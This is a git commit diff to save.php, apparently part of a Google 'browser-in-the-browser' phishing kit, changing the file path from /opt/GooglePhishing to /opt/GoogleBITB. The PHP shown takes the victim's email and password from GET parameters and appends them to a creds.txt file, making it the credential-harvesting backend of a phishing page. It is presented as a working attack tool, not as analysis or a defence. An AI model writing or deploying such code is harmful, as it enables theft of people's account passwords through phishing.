b957f23bb57719c1ddb9e3823364090edcb1193e
jakedmurphy1 <44781280+jakedmurphy1@users.noreply.github.com>
2022-05-31 12:29:21 -0400

    Update save.php

--- save.php
+++ save.php
@@ -3,7 +3,7 @@
 $username = $_GET['email'];
 $password = $_GET['password'];
 
-$myfile = fopen("/opt/GooglePhishing/creds.txt", "a") or die("Unable to open file, ensure filepath is correct (Line 6) and chmod 666 it.");
+$myfile = fopen("/opt/GoogleBITB/creds.txt", "a") or die("Unable to open file, ensure filepath is correct (Line 6) and chmod 666 it.");
 
 fwrite($myfile, $username);
 fwrite($myfile, ":");
